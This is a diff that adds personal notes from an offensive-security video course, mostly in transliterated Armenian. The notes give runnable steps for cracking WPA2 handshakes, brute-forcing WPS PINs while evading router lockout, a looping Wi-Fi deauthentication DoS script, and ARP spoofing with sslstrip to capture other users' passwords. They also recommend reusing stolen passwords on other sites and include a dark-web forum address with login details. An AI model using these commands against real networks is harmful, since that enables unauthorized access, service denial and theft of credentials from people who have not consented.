@@ -1,0 +1,513 @@
+https://skladchik.com targman80
+https://nmap.org/nsedoc/
+open browser -> exploitdb -> www.exploit-db.com
+
+man in the midle
+
+<<<<<{
+		airodump-ng wlp2s0
+		airodump-ng -c [CHANNEL] -w [FILE]--bssid
+		
+		aireplay-ng -0 0 -a [MAC]
+		
+		aircrack-ng -w capture.cap[word list]
+		aircrack-ng -w passlist.txt SCANNED_result_test-01.cap -e soutln 
+	}
+>>>>>>
+
+		airdump-ng wlan0 -> cuyc e talis bolor anlar tochki dostupner@
+		airodump-ng -c 6 -w SCAN_test --bssid 90:F6:52:C1:BB:18 wlan0 -> (-c chanel, -w grum enq SCAN_test fayli mej, video 4 00:40:00)
+
+
+
+
+
+
+The Final step to access the hidden wiki is to paste this url to tor browser: http://zqktlwi4fecvo6ri.onion/wiki/
+http://zqktlwi4fecvo6ri.onion/wiki/
+
+TP-LINK TL-WN722N Wi-Fi
+
+proxychains firefox www.duckduckgo.com
+service tor start
+macchanger -s eth0
+nmap
+nslookup
+curl ipinfo.io/74.2.7.244.221 ->(1000 per a day)
+searchsploit
+ 
+
+
+lesson1)
+route -> cuyc e talis mer routeri ip(kam ifconfig wlan0 | grep inet)
+1)need
+wifi card + driver for card (atheros, broadcom)
+
+1-video)
+	nerac80 + install virtualbox + config internet
+	white/grey/black hat
+	Footprinting -> informatiayi havaqum(server ip, opened ports, started services)
+	Dos ( just you )
+	DDos ( multiple people (FUD + RAT))
+	FUD ( anti-virus can not detect )
+	RAT (remote administration tool)
+	Fishing (email link kam poxum e routeri dns serveri zaprosner@ ayl serveri)
+	SQL Injection
+	VPN (virtual private network)
+	Proxy
+	Tor (taqcnum e cragir@ packet@ uxxarkum e mi qani routerneri mijocov (ka naev tor brauser) 
+		orinak ete menq bacum enq firefox bayc mer kap@ chi ancnum tori mijov apa menq chenq 
+		karox mtnel taqcvac sayter@ voronq poiskavikner@ chen indexavorel)
+	VPS (virtual private service)
+	Key loggers
+	Terminal
+	Firewall (kargavorvac e ip table-ov)
+	Root kit (cragir e vor@ instal aneluc karox e takcnel process@ systemayic)
+	Reverse-shells (obratnaya obalochka cragir e vor@ install enq anum myus 
+		sarqavorman vra vor@ kap e hastatum mer her)
+		
+
+os Fedora e bolor hramanner@ fedorayi hamar en
+		
+Install virtual box
+	1)download virtual box
+	2)uname -a shows architecture 32 or 64 bit
+	3)open terminal type su
+	4)install  virtual box@ ays exanakov obnavlenianer@ hasaneli chen lini
+		1 exanak)rpm -ih /home/username/download/virtualbox_******.rpm   -> (-i => install, h => shows status bar)
+		2 exanak) open browser type rpmfusion (01:10:00 watch video 1 )
+			exanak)yum search virtualbox
+				   yum install virtualbox -y	
+				   yum update
+				   
+	5)install kali on virtual box
+		2g ozu
+		25g dinamik disk
+		01:29:00(ekrani chaper)
+		instali jamanak mul@ block e @nkmum, blockic hanelu hamar sexmel aj ctrl
+			tabov aj kam dzax, probelov nshum enq, enter
+		after install
+		 ping yahoo.com  not works not internet conection
+			press mashine->network-> change NAT to Bridged adapter (video 1 01:55:00)
+				ping yahoo.com  not works
+				cd /etc/NetworkManager
+				nano NetworkManager.conf
+					managed=true and ctrl+o(for save) -> ctrl+x(for exit)
+				service network-manager restart
+		install obnavlenie
+			apt-get update
+			apt-get upgrade
+		
+2-video)
+		1)kargavorel repositorianeri cank@
+			cd /etc/apt
+			nano sources.list
+			avelacnel kali repositorin ev pahpanel
+			apt-get update
+			ays proces@ katarum enq vorpeszi hasaneli linen lracucich cragrer@ vorov kkaroxananq ekran@ mecacnel
+			apt-get update && apt-get install -y dkms linux-headers-$(uname -r) 
+				install e linum 2 paket (dkms ev linux-headers*****)
+			apt-get upgrade
+			press devices->Insert Guest additional CD image (will be not works)
+				cd /media/cdrom0 ->stex e gtnvum bolor virtual diski informacian
+				cp VBoxLinuxAdditios.run /home/
+				cd /home/valod
+				for run use  -> ./VBoxLinuxAdditios.run
+				press Device->SharedClipboards->HostToGuest for copi paste local compinfo to virtual comp
+				reboot (kam init 3 kam init 5)
+				
+		2)for dark web
+		apt-get install tor -y
+		dont use useradd
+		(deluser(for delete user))
+		adduser	test
+		
+		after create new user switch to test user
+		then open browser and type tor. go to https://www.torproject.org
+		download tor->extract->run
+		type hiddenwiki for found ssilki onion hiddenwiki url poxvum e an@ndhat(ays pahin http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page)
+	
+		ctrl+d -> add to bookmark
+		ctrl+b ->show bookmark
+		go to forums and find intel exchange -> http://rrcc5uuudhh4oz3c.onion/ ->intel exchange login->alexis2018 pass->halamola masterpass->test2019
+		
+		3)anonym (tor + proxy chain arden install exac en kalii mej) video 2 01:23:00
+			nano /etc/proxychains.conf
+			dynamic_chain
+			#strict_chain
+			add in last line socks5	127.0.0.1 9050
+			save
+			service tor status
+			service tor start
+			
+			www.duckduckgo.com -> poiskovik e vor@ apahovum e anonimnost chi grum mer ip -in
+			proxychains firefox www.duckduckgo.com
+				when opens browser type 
+					check for dns leaks ->(check ip it should be changed to different ip address)
+				
+				<nataice>
+				after configuring files every time when i vont to was anonym should viddo 2 01:41:00
+				service tor start
+				proxychains firefox www.duckduckgo.com
+				</nataice>
+				
+			proxychains nmap firefox
+				1)proxychains ->for anonim (firefoxi trafikn ancnum e proxychainov)
+				2)nmap 
+			
+		4)importirovat proxy list  video 2 01:50:00
+			open browser type free socks5 proxies
+			gtnum enq lav erkrner@ voronq info chen tramadrum ayl erkrnerin(niderland, china, russia, germany)
+			
+			nano /etc/proxychains.conf
+			hamozvel vor dinamik_chain commentic hanac e
+			mutqagrum enq proxyneri tvyalner@ orinakov 
+													   socks5 546.456.456.456 7777
+													   socks5 789.789.789.786 8888
+													   socks4 159.159.159.159 5656
+													   socks5 343.165.684.178 8794
+																			
+																			->save
+			proxychains firefox www.duckduckgo.com
+					
+3-video) VPN 
+	1)ete wifi internet chka
+		nano /etc/NetworkManager/NetworkManager.conf
+		managed=true  ->save
+		service network-manager restart
+	2)mez anhrajesht cragreri cank
+		apt-get install network-manager-openvpn-gnome -y
+		apt-get install network-manager-pptp -y
+		apt-get install network-manager-pptp-gnome -y
+		apt-get install network-manager-strongswan -y
+		apt-get install network-manager-vpnc -y
+		apt-get install network-manager-vpnc-gnome -y		
+		kam
+		apt-get install network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome -y
+		
+		service network-manager restart
+	3)open browser type www.vpnbook.com video 3 00:08:00
+		download packet and izvlech
+		kak podkluchit vpn cherez terminal (karox enq anel naev grafikakan exanakow)
+		cd to izvleched packet and type
+			openvpn --config vpnbook-de233-tcp443.ovpn
+			type username and password it provides on downloaded sites(-----username:vpnbook password:jmm66cf-----)
+			configuraciayi avartic heto bacum enq browser ev stugum mer ip(arden petq e poxvac lini)
+			bayc sa bavarar che dns leak test(type in browser check for dns leak) ancnelu hamar petq e katarel lracucich gorcox80ner vorpeszi ISP dashtum chereva mer provider@
+				bacel nor terminal
+				nano /etc/resolv.conf
+				comment enq anum ip -> stex e gtnvum voch te routeri ipn ayl mer naxqan routeri hasnelu ipn. ev menq chenq uzum vor mer comp@ ogtagorce mer provideri dns server@, aysinqn mer dns zaprosner@ hasnum ein stex ev mer router@ uxarkum er internet providerin vor@ grancum er mer amboxj trafik@(gtnvelu vayr ev ayln)
+				bacum enq browser -> type opendns -> find dns (208.67.222.123, 208.67.220.123)
+				grum enq ays ip-ner@ -> save
+		
+	4)mac address(poxel mac address)
+		ifconfig eth0
+			00:00:00:00:00:00
+			araji ereq zuyg -> artadroxi identifikacian e(karox enq poxel vorpeszi asenq vor kompanian e nerkayacnum ays sarq@)
+			erkrord ereq zuyg -> konkret apranqi id e(voronq chenq karox jnjel)
+			ifconfig eth0 | grep HWaddr
+			macchanger
+			macchanger -s eth0 -> shows mac address
+			macchanger -l -> artadrox @nker80neri mac list(aysinqn arajin 3 zuyger@)
+			macchanger -r eth0 ->(poxum e mac address@ random macov)
+	5)erkarajamket tasker voronq petq e ashxaten anjateluc miacneluc u inchvor jamanakahatvacum
+		ifconfig ->shows eth0 lo
+		qani vor virtualov enq ev kpac chenq wifi-in (chunenq wifi interface) katarum enq real compi vra(fedorayi vra)
+		menq kogtagorcenq eth0 ete liner wifi interface kliner ayspes eth1
+		crontab --help
+		crontab -e ->aystex enq grum tasker@ voronq petq e katarven
+		qani vor ej@ bacvum e vi redaktrov sexmum enq i (insert rejim) ev verji toxin grum enq
+		@reboot macchanger -r eth0
+			esc + :wq
+	6)footprinting	
+		scanmc.nmap.org ->https://nmap.org(naxatesel en scan anelu hamar amenashate 1 or@ 100 hat)
+		nmap zenmap(grafikayov)->gorciq e cancer@ scan anelu hamar
+		nmap --help
+		orinak ->nmap -v -sn 192.168.0.0/16 10.0.0.0/8  16 ev 8 da scan anelu diapazonn e(sovorabar chen ogtvum ayl naxoroq grum en ip-neri cank@ ev scanavorum) video 3 00:49:00
+		browser ->major ip blocks ->http://www.nirsoft.net/countryip/ -> cuyc e talis ip diapazonner@ ev um en dranq patkanum ->@ntrum enq
+		voreve ip ->browser search->who is 156.156.156.156 ev imanumen q info ip-i masin (https://ipinfo.io/)
+		nslookup scanme.nmap.org ->shows router dns ip #53(port) heto domain@ ev ira ip address@
+		nslookup ashxatum e naev hakarak ->nslookup 153.153.153.153
+		nmap scanme.nmap.org -vv ->(vv shat info cuyc talu hamar port state service)
+		
+		scan anenq mer local ip-n
+		ifconfig ->vercnum enq ip-n
+		nmap -oG - 192.168.0.0-255 -p 22 -vv > /home/SCANNED_result
+		cd /home
+		ls | grep SCANNED_result
+		less SCANNED_result
+		cat /home/SCANNED_result | grep Up
+		cat /home/SCANNED_result | grep Up | awk -F " " '{print $2}'  -> (awk-ov bajanum enq probelneric " " ev tpum 2 elementner@) > SCANNED_result_2
+		nmap -iL /home/SCANNED_result_2 -vv
+		->ays hramannerov menq gtanq inch hoster kan cancum
+		
+		
+		curl ipinfo.io/74.2.7.244.221 ->(1000 per a day) location info
+		
+		https://nmap.org/book/man-nse.html
+		https://nmap.org/nsedoc/
+		open browser -> exploitdb -> www.exploit-db.com
+		cd /usr/share/nmap/scripts/
+		ls
+		nmap --script banner 192.168.0.1 ->shows open tcp ports
+		nmap --script "http*" 192.168.0.1
+		nmap --script default 192.168.0.1
+		https://www.youtube.com/watch?v=dvF-7KK0g6E
+		
+	7)wifi hack (bruteforce ) virtual boxi vra chi lini petq e anenq iskakan 	compi vra(fedorayi vra) video 3 01:36:00
+		videodasic durs ->https://lifehacker.ru/2012/10/27/kak-vzlomat-wi-fi-set-s-wep-shifrovaniem/
+		anhrajesht e usb cancayin cart(vor@ an@ndhat petq e lini monitoringi ev canci scanavorman rejimum vorpeszi imananq mac hascen router ev zohi, da hesht e qani vor 2 mac hascenern el hasaneli en(public), mezanic pahanjvum e dranq kardal 01:40:00)
+		+ hamapatasxan cragrer(aircrack-ng kam reaver)
+		yum search aircrack-ng
+		yum install aircrack-ng -y
+		
+		reaver installi hamar fedorayi repositoriayum chka petq e qashel internetic(bayc lav@ che)->open firefox search reaver google code->https://code.google.com/archive/p/reaver-wps/downloads
+		cd ~/Desctop/downloadedreaver   kardal readme fil@
+		
+4-video)bruteforce wifi 
+	<<-------windowsi hamar download http://www.aircrack-ng.org/------>>
+	
+	1)arajin exanak wifi kotrelu
+		crunch ->parolneri cank generacnelu hamar e
+		duckduck.go->crunch pass generator->https://sourceforge.net/projects/crunch-wordlist/ ->download 
+		cd `/Desktop/downloaded _crunch -> ete tesnum enq MakeFile terminalum grum enq make ->make install, mez petq che root prava
+		man crunch
+		crunch 3 5 abcd123 | aircrack-ng
+	
+		aircrack-ng -w passwordlist.txt
+	
+		crunch 3 29 abcdefghijklmnopqrstuvwxyz | aircrack-ng -w -     ->crunch chi mtapahe bolor ays parolner@ isk aircrack-ng kkarda ev kjnji dranq vorpeszi gtni hamapatasxan parol@
+		video 4 00:19:29 ->virtualbox + wifi adapter
+		<<-------https://www.youtube.com/watch?v=VmyaPOIPPuI----------->>
+		<<-------https://www.youtube.com/watch?v=jMbppmRk-I8----------->>
+		ifconfig ->(tesnum enq mer wifi interfacner@ eth0, lo, wlan0)
+		iwlist wlan0 scan | grep ESSID  -> scanavorum e bolor hasaneli wifi cancer@ ev karox enq kpnel dranc
+		00:26:00
+		1)petq e mer setevoy cart@(orinak wifi carti anun@ wlan0 e im depqum) dnel rejim monitoringi tak(ka 2 exanak)
+		ifconfig wlan0 down  -> anjatum e wifi cart@ vorpeszi karoxananq popox80ner anel
+		iwconfig wlan0 mode monitor -> poxum enq mode monitor defaultov  promiscuous e,  monitori ev promiscuous mederi tarber80@ ayn e vormonitori jamanak @ndunum enq bolor packetner@ kap chuni kpac e cancin te voch isk myusi jamanak @ndunum e miayn ayn packetner@ vor cancin or kpac e
+		ifconfig wlan0 up -> miacnum e wifi cart@ -> ekr verevi aj masum khaytnvi vor wifi kap@ aktivacvac e
+		iwconfig wlan0 
+	
+		airmon-ng check wlan0 ->aystex menq karox enq nayel procesner@ voronq karox en xndirner stexcel interferenci patcharov
+			hramanic heto cuyc e tvel
+			PID			Name
+			1215		avahi-deamon
+			1216		avahi-deamon
+			1312		NetworkManager
+			1556		wpa_supplicant
+			17917		dhclient
+		
+			arajin@ vor anhrajesht e ubit NetworkManager
+			kill 1312
+			airmon-ng check wlan0 ->amen angam petq e stugenq procesner@vorovhetev mek@myusi het hnaravor e kapvac en ev mi proces@ karox e start tal myusin
+			kill dhclient ->vorpeszi kasecnenq cankacac interferenc
+			airmon-ng check wlan0
+			heto karox enq spanel myusner@
+			kill 1556 1215 1216
+			airmon-ng check wlan0 -> spaneluc heto noric haytnvum en dra hamar katarum enq
+			kill 1215
+			kill 1216
+			airmon-ng check wlan0 -> tesnum enq aylevs xangarox procesner chkan
+		
+			hajord@ petq e scanavorenq mijavayr@ vorpeszi tesnenq voronc petq e kpnenq, dranc chi tesnum NetworkManager@ vorovhetev karox e tesnel miayn tesaneli tochki dostupner@ mer shurjbolor@
+			isk airmon-ng mode monitoring karox e tesnel voch miayn tochki dostupner@ aylev ov e dranc kpac
+			airodump-ng wlan0 -> cuyc e talis bolor anlar tochki dostupner@
+				BSSID				PWR		Beacons		#Data,	#/s		CH	MB		ENC		CIPHER	AUTH	ESSID
+				90:F6:52:C1:BB:18	-30		84			2		0		6	54e.	WPA2	CCMP	PSK		soutln
+				54:04:A6:8D:D3:CC	-57		43			25		5		1	54e		WPA2	CCMP	PSK		mresko-tenda
+				54:BE:F7:11:4E:F9	-84		3			0		0		11	54e.		WPA2	CCMP	PSK		mresko
+		
+			PWR -> kapi ujn e -30 aveli lavn e qan -84
+			inchpes kotrenq WPA2 kodavorum@
+			kentronanum enq arajini vra(90:F6:52:C1:D3:CC)
+			airodump-ng -c 6 -w SCAN_test --bssid 90:F6:52:C1:BB:18 wlan0 -> (-c chanel, -w grum enq SCAN_test fayli mej, video 4 00:40:00)
+				ardyunqum tesnum enq BSSID ev STATION (station@ da ayd cancin kpac ayl sarq e)
+				BSSID				STATION				PWR		Rate	Lost	Frames Probe
+				90:F6:52:C1:BB:18	28:BA:B5:0D:A0:24	-20		0e- 1e	0		21
+				menq chenq karox ogtagorcel ays method@ ete me tochka dostupin kpac che voreve klient, vorovhetev menq chenq karoxana @ndunel voreve proces vor@ kapvac e authentifikaciayi het
+			hima kporcenq deauthentifikacnenq ayd sarq@, ays methodov kareli e kirarel naev dos attack anlar canceri vra
+			basum enq nor terminal
+			aireplay-ng -0 0 -a 90:F6:52:C1:BB:18 wlan0 ->erkrord zron cuyc e talis qanak@ te qani angam enq uzum deauthentificacnenq ete 0 e uxarkum enq ansahmanapak qanaki, aysinqn an@ndhat anjatum enq sarq@ vora porcum e kpnel tochka dostupin(90:F6:52:C1:BB:18);
+			qich spaseluc heto erb arden deauthentificacvac en sarqer@ @ndhatum enq CTRL + c ev spasum enq 1 terminali vra petq e sarqer@ porcen authentifikacia ancnel
+			erb haytnvi wpa handshake: 90:F6:52:C1:BB:18 karox enq dadarecnel 1 terminalov scanavorum@(proces zaxvat@), menq stacel enq informacian ev grel fayli mej
+		
+			crunch 10 11 -t %%%%hpoop 1234567890 | aircrack-ng -w - SCAN_test-01.cap -e soutln ->(-w nshanakum e text vercnel crunchi tvacic)
+			crunch 10 11 -t %%%%,phpoop charset.lst mixalpha-numeric-space | aircrack-ng -w - SCAN_test-01.cap -e soutln ->(-w nshanakum e text vercnel crunchi tvacic)
+		
+		2)erkrord exanak(pin codov authentifikacia) QSS(Quick Secure Setup)
+			qani vorpin cod@ kazmvac e miayn tveric hamematabar hesht klini
+			hamarya bolor routerneri mej pin kodov authentifikacian drvac e poumolchaniu 01:10:00 
+			vat@ ayn e vor mi qani angam pin@ sxal havaqelu jamanak block e @nknum ev matavorapes 1 jam anhasaneli e darnum
+			
+			reaver --help
+			ifconfig wlan0 down
+			iwconfig wlan0 mode monitor
+			ifconfig wlan0 up
+			
+			airmon-ng check wlan0 ->aystex menq karox enq nayel procesner@ voronq karox en xndirner stexcel interferenci patcharov
+				hramanic heto cuyc e tvel
+				PID			Name
+				1215		avahi-deamon
+				1216		avahi-deamon
+				1312		NetworkManager
+				1556		wpa_supplicant
+				17917		dhclient
+		
+				arajin@ vor anhrajesht e ubit NetworkManager
+				kill 1312
+				airmon-ng check wlan0 ->amen angam petq e stugenq procesner@vorovhetev mek@myusi het hnaravor e kapvac en ev mi proces@ karox e start tal myusin
+				kill dhclient ->vorpeszi kasecnenq cankacac interferenc
+				airmon-ng check wlan0
+				heto karox enq spanel myusner@
+				kill 1556 1215 1216
+				airmon-ng check wlan0 -> spaneluc heto noric haytnvum en dra hamar katarum enq
+				kill 1215
+				kill 1216
+				airmon-ng check wlan0 -> tesnum enq aylevs xangarox procesner chkan
+				<<---ete petq e het berel procesner@ (service NetworkManager restart) >>>>
+				menq petq e stugenq anlar miacumner@ mer shrjakayqum(scanaworenq) u dranc ter80ner@ ev da kanenq wash hramanov
+				wash -i wlan0 -> sksum e scanavorel ete chashxatec katarum enq
+				mkdir /etc/reaver
+				wash -i wlan0
+					BSSID				Chanel		RSSI	WPS Version		WPS Locked		ESSID
+					90:F6:52:C1:BB:18	1			00		1.0				No				soutln
+					54:04:A6:8D:D3:CC	6			00		1.0				No				mresko-tenda
+					54:BE:F7:11:4E:F9	11			00		1.0				No				mresko
+				ushadr80 petq e darcnenq vor WPS Locked lini No ete grvac e Yes uremn ayd tochka dostupi vra WPS anjatvac e ev chenq karoxana pin code gtnel
+				airodump-ng wlan0 ->stugenq kapi uj@
+				reaver -b 90:F6:52:C1:BB:18 -i wlan0 -vv
+				reaver -b 90:F6:52:C1:BB:18 -i wlan0 -c 6 -vv -> mi qich heto hnaravor e router@ block @nkni ev petq e spasenq vorosh jamanak vorpeszi noric porcenq
+				
+				
+				inchpes shrjancel routeri blockirovken
+				1 exanak)sahmanapakum enq reaveri pin uxarkman proces@ orinak 2 pin mek ropeum
+				reaver -i wlan0 -b 90:F6:52:C1:BB:18 -c 6 -r 2:300 -vv ->(-r 2:60 2 porc 300 vayrkyanum) karox e tevel motavorapes 3 shabat
+				
+				2 exanak)yuraqanchyur router uni algorithm vorov generacnim e piner@
+					generaciayi hakarak funkcianeri mijocov kareli e gushakel inch pin e ev vor routerneri hamar e,
+						orinak d-link routerner@ generacnum en piner@ himnvelov mac addresi skzbnamasi vra (pingen.py -> browser->search-> wps algorhitmi dlya d-link)
+						./pingen.py 90:F6:52:C1:BB:18
+					 
+5)dos hardzakum	ev block any wifi	
+	1)
+		1)ancnum enq rejim monitoring  (./monitor.sh) kam airmon-ng start wlan0
+		less monitor.sh
+			ifconfig wlan0 down
+			macchanger -r wlan0
+			iwconfig wlan0 mode monitor
+			ifconfig wlan0 up
+			iwconfig wlan0 | grep Mode
+			
+		2)airmon-ng check wlan0
+		3)airodump-ng wlan0
+		4)aireplay-ng -0 0 -a 90:F6:52:C1:BB:18 wlan0
+				No such BSSID available
+				Pleasespecify an ESSID (-e).
+				->menq chenq karox uxatkel paketner@ qani vor 90:F6:52:C1:BB:18 gtnvum e 6 chaneli vra isk mer access point@(noutbooki vra) 3 chaneli vra e
+				->petq e kargavorenq mer wifi cart@
+			iwconfig wlan0 channel 6 		-> hima mer wifi cart@ achxatum e 6-rd chaneli vra
+		aireplay-ng -0 0 -a 90:F6:52:C1:BB:18 wlan0  -> sa deauthentificacnum e cancum bolor clientnerin karox enq anel naev konkret clienti vra  aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 -c 28:BA:B5:0D:A0:24 wlan0
+	
+	2)
+		airodump-ng --bssid 90:F6:52:C1:BB:18 --chanel 6 wlan0
+		airodump-ng --bssid 90:F6:52:C1:BB:18 wlan0   ->verevi dzax ankyunum tesnum enq chanel@ 6, ete chanel@(1-ic 14) poxvi menq ktesnenq, ev da kxangari mer dos attack@, petq e dzerqov poxenq mer wifi carti chanel@
+		inchpes gtnenq ete client@ poxi ir MAC(BSSID), CHANEL, ESSID)
+			skzbic petq e tesnenq clientnerin ovqer kpac en wifi routerin
+				airodump-ng wlan0  ->nayum enq STATION dashti kpacnerin
+				erb poxvi routeri MAC(BSSID), CHANEL, ESSID clientner@ nuyn@ kmnan
+			
+			bash script ->
+				#!/bin/bash
+				while true
+				do
+						aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 wlan0
+						ifconfig wlan0 down
+						macchanger -r wlan0 | grep "New MAC"
+						iwconfig wlan0 mode monitor
+						ifconfig wlan0 up
+						iwconfig wlan0 | grep Mode
+						sleep 3
+						echo Waiting!!!!!!!
+				done
+			
+			bash script bacatr80->ansahmanapak cikl e
+				uxarkum en 5 zapros deauthentificaciayi concret 90:F6:52:C1:BB:18
+				5 zaprosic heto poxum anjatum enq interface-@
+				macchanger-ov poxum enq mer mac-@ patahakan MAC-i u tpum
+				poxum enq cancayin carti rejim@ monitor
+				tpum enq carti rejim@
+				3 vayrkyan spasum enq
+				tpum enq Waiting
+				u aydpes sharunak katarum enq dos attack 3 vayrkyan@ mek
+				naev karox enq faylic kardanq MAC-@ ev naev poxenq chanel@ iwconfig wlan0 chanel 7
+					aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 -c 28:BA:B5:0D:A0:24 wlan0   ->deauthentificacnum enq koncret clienti(28:BA:B5:0D:A0:24)
+
+		
+		naev karox enq
+			airodump --bssid 90:F6:52:C1:BB:18 --channel 6 wlan0  -> hetevum enq 6-rd channelin u ete nkatum enq popox80 katarum enq hamapatasxan gorcox80ner
+				aysinqn ete korcrel enq ays 90:F6:52:C1:BB:18 tochka dostup@ tesadashtic, hnaravor e poxvel e channel@ kam BSSID-in 
+			
+	3)->sslstrip ev arp spufing (wifi canceri hardzakum) ->chenq ogtvum monitor rejimic petq e naxoroq kpac linenq voreve canci	
+			mez petq e 2 cragir(sslstrip)
+			1)	sslstrip cragir@ HTTPS to HTTP e darcnum ev karox enq tesnel amboxj trafik@ aranc kodavorvac
+				yum search sslstrip
+				yum install sslstrip -y
+			2)fedorayi hamar anun@ dsn (dsniff)e isk mnacacneri hamar arpspoof
+				cragir@ petq e dns spoofingi hamar aysinqn routerin xapelu hamar vorpeszi inch packetner vor stacav router@ uxxarki mez
+				menq karox enq stanal packet@ ->poxancel routerin isk router@ uxxarki internet
+				
+				->qayl 1 petq e xabel routerin forpeszi routeric konkret ogtvoxneri packetner@ uxxarki mez menq kjnjenq kodavorum@ ev packet@ het kuxarkenq routerin
+				->heto router@ kuxarki packet@ internet HTTP -ov aysinqn  maqur text, 
+				->ayspisov menq kanckacnenq hardzakum man in the midle, u menq kkaroxananq kardal ogtagorcoxi tvyalner@ maqur textov
+				->sa 100% anoc che bayc lav kachxati internet exploreri qan googlei kam firefoxi mej
+				->99% paypali vra chi ashxati, 95% facebooki vra chi ashxati bayc qani vor mardik mecamasamb ogtagorcum en nuyn password@  tarber sayteri hamar  u hamarya mnacac tvyalnern el nuyn@(usernameer@)
+				->apa karox enq vercnel parol@ u porcel ayn sayteri vra voronc pashtpan80@ ujex e.sa hajox practica e
+				
+				yum search dsn
+				yum install dsniff
+	4)cancayin kargavorumner vorpeszi veracnenq ssl kodavorum@ vorosh packetneric, voronq kverahasceavorenq inqners mez video 5  00:40:00
+			1step)
+				echo 1 > /proc/sys/net/ipv4/ip_forward
+					cat /proc/sys/net/ipv4/ip_forward
+					defaultov mer compi mej grvac e zro
+				iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080  ->iptables firewoli kargavorum vorpeszi redirect anenq port@, aysinqn mi porti trafik@ petq e uxxarkel myus portin, 80 portic ayn portin vor@ lsum e sslstrip@(8080)
+				iptables -t nat -L PREROUTING  ->stugum enq inch enq arel
+				
+				hima gtnenq te um petq e hardzakvenq	
+					ifconfig
+					ifconfig wlan0
+					route -> tesnum enq mer routeri ip-n
+					nmap 192.168.1.1/24 ->skanavorum e bolor entacancer@
+					kam	nmap 192.168.1.2-254 ->vorpeszi heracnenq mi qani ip-ner
+					192.168.1.2-254 -vv  ->cuyc e talis bolor ashxatox hoster@ mer canci
+						ete voreve host chenq gtel ogtagorcum enq
+					192.168.1.2-254 -Pn -vv	kam
+					192.168.1.2-254 -O -vv	 -> vorpeszi gtni operacion system@
+						bacum enq mer virtual boxov windows -> ipconfig->mer ip-n 192.168.1.100 e sa mer tiraxn e, petq e heracnenq kodavorum@ ev stananq trafik@
+					fedorayic menq ogtvum enq 3 terminalic vorpeszi 2 hatov hardzakvenq isk errordov tesnenq ardyunq@
+	5)verjnakan ardyunqi stacum sslstripic
+		katarum enq arpspoof-i hraman@ 2 angam
+			skzbic menq kasenq routerin vor es hamarvum em windows meqenan isk heto kasenq windowsin vor es hamarvum em router@,
+			
+		arpspoof -i wlan0 -t 192.168.0.1 -r 192.168.0.103
+			192.168.0.1 routeri ip-n e				
+			192.168.0.103 windowsi ip-n e
+		arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1
+		
+		menq petq e bacenq port@ dzerqov iptables-i mijic
+		qani vor xndir e arajacel aysinqn 8080 port@ lsum e mer cragir@ bayc iptables@ pakel e ev tuyl chi talis trafiki hasnel@ mer cragrin(sslstrip)
+		iptables -L INPUT		
+		iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT   ->(INPUT 1<->mek)petq e bacel port@ vorpeszi sslstrip@ karoxana lsel
+		iptables -L INPUT
+		sslstrip -l 8080 -> (-l levon-l)miacnum enq sslstrip cragir@ ev lsum 8080portin ekac zaprosner@
+			qani vor informacian shat e linelu menq klogavorenq
+		myus terminalic
+			tail -f sslstrip.log  -> tail@ bolor popox80ner@ kgri sslstrip.log fayli mej
+		bacum enq mer windows@
+			bacum enq firefox ev internet explorer@
+			vorpeszi tesnenq inch vor baner meki hama kashxati myusin voch, da kaxvac e browserneri pashtpan80ic
+			
+			video 5 01:08:00
+	6)poxel het uxxarkwox contenti parunak80@
+		
